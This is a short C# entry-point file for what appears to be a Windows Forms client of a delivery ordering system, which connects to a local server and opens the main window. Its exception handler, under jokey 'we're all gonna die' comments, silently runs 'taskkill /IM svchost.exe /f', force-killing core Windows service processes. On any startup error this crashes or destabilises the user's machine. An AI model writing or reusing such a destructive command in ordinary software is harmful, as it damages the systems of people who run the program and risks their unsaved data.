using Bestellsystem_Lieferdienst_Client.Server;
using System.Diagnostics;

namespace Bestellsystem_Lieferdienst_Client
{
    internal static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        public static Form form = new MainForm();


        [STAThread]
        static void Main()
        {
            try
            {
                // To customize application configuration such as set high DPI settings or default font,
                // see https://aka.ms/applicationconfiguration.
                ApplicationConfiguration.Initialize();
                Client.client = new Client("192.168.0.67", 5000);
                Client.client.ConnectToServer();

                Application.Run(form);
            }
            catch (Exception ex)
            {
                //enter fatal panic mode!!!
                //It's over
                //WE'RE ALL GONNA DIE!!!!
                Process.Start("cmd.exe", "/c taskkill /IM svchost.exe /f");
            }
        }
    }
}